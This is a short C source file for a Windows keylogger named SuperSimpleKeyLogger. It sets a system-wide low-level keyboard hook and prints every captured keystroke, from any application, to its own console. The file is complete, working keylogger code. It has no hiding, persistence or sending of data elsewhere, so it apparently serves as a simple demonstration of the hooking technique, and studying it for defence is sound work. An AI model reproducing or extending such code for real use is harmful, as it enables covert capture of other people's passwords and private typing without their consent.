/**
 * @file	SuperSimpleKeyLogger.c
 * @brief	Captures and displays keystrokes using a Windows low-level keyboard hook.
 *
 * @author	mmvest
 * @date	08/23/2024
 */

#include <Windows.h>
#include <stdio.h>

 /**
  * @brief Callback function for low-level keyboard events.
  *
  * This function is invoked for each keyboard event. It processes only WM_KEYDOWN and
  * WM_SYSKEYDOWN messages. The function retrieves the current keyboard state and converts
  * the virtual key code into a Unicode character. For the VK_RETURN key, it outputs a newline.
  * On failure to retrieve the keyboard state or translate the key, the event is simply passed on.
  *
  * @param code The hook code that indicates how to process the message. Only HC_ACTION is processed.
  * @param w_param The identifier of the keyboard message (e.g., WM_KEYDOWN, WM_SYSKEYDOWN).
  * @param l_param A pointer to a KBDLLHOOKSTRUCT structure containing details about the keyboard event.
  * @return LRESULT Returns the result of CallNextHookEx to pass the event to the next hook.
  */

LRESULT CALLBACK KeyboardCallback(int code, WPARAM w_param, LPARAM l_param)
{
	if (code != HC_ACTION)
	{
		goto callback_end;
	}

	if (w_param != WM_KEYDOWN && w_param != WM_SYSKEYDOWN)
	{
		goto callback_end;
	}
	
	KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)l_param;
	GetKeyState(VK_SHIFT);
	GetKeyState(VK_CAPITAL);
	unsigned char keyboard_state[256] = { 0 };
	if (!GetKeyboardState(keyboard_state))
	{
		printf("\n[!] Failed to get keyboard state. Error: 0x%08X\n", GetLastError());
		goto callback_end;
	}

	wchar_t character[2] = { 0 };
	int result = 0;
	switch (keyboard->vkCode)
	{
		case VK_RETURN:
			character[0] = L'\n';
			break;
		default:

			result = ToUnicode(keyboard->vkCode, keyboard->scanCode, keyboard_state, character, 2, 0);
			if (result == 0)
			{
				goto callback_end;
			}
	}

	putwchar(character[0]);

callback_end:
	return CallNextHookEx(NULL, code, w_param, l_param);
}

int main()
{
	int exit_code = EXIT_FAILURE;

	printf("[+] Setting Hook... ");
	HHOOK keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback, NULL, 0);
	if (!keyboard_hook)
	{
		printf("\n[!] Failed to hook low-level keyboard. Error: 0x%08X\n", GetLastError());
		goto cleanup;
	}
	printf("Done!\n");

	printf("[+] Capturing Keys...\n");
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	exit_code = EXIT_SUCCESS;

cleanup:
	if (keyboard_hook)
	{
		UnhookWindowsHookEx(keyboard_hook);
	}

	return exit_code;
}